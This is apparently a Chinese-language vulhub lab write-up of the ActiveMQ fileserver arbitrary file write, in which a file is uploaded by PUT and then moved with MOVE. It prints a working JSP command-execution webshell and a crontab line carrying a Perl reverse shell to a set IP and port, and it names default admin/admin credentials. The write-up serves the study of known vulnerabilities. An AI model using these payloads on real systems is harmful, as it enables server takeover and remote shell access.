# ActiveMQ任意文件写入漏洞

###### by ADummy

### 0x00利用路线

​			Burpsuite构造包上传webshell--->Burpsuite构造包移动文件--->访问webshell--->代码执行

### 0x01漏洞介绍

​			本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。

​			ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：

> 1.其使用率并不高
>
> 2.文件操作容易出现漏洞

​			所以，ActiveMQ在**5.12.x~5.13.x**版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在**5.14.0**版本以后，彻底删除了fileserver应用。在测试过程中，可以关注ActiveMQ的版本，避免走弯路。

​		ps:摘自xssle师傅

### 0x02漏洞复现

**三种方法：**

**1.webshell**

**2.编写crontab自动化弹shell**

**3.编写jetty.xml或jar，覆盖jetty.xml，删除admin和api的登录限制，然后编写webshell(未测试)。**

**在某些情况下，jetty.xml和jar的所有者是Web容器的用户，因此编写crontab的成功率更高。**

**webshell:**

```
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

**查看绝对路径界面http://your-ip:8161/admin/test/systemProperties.jsp**

**登录名/密码  admin/admin**

​			**默认页面**

![ActiveMQ任意文件写入_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_1.jpg)

​			**绝对路径页面**

![ActiveMQ任意文件写入_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_2.jpg)

​			**上传webshell**

![ActiveMQ任意文件写入_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_3.jpg)

​			**移动webshell到 /api/shell.jsp**

![ActiveMQ任意文件写入_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_4.jpg)

​			**访问webshell(需要登录)，命令执行**

![ActiveMQ任意文件写入_5](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_5.jpg)

​			**编写crontab自动化弹shell**

```
*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="192.168.15.128";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

​			**上传crontab**

![ActiveMQ任意文件写入_6](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_6.jpg)

​			**移动crontab到/etc/cron.d/root**

![ActiveMQ任意文件写入_8](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_8.jpg)

​			**反弹shell**

![ActiveMQ任意文件写入_7](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ任意文件写入_7.jpg)

### 0x03参考资料

https://www.freebuf.com/vuls/213760.html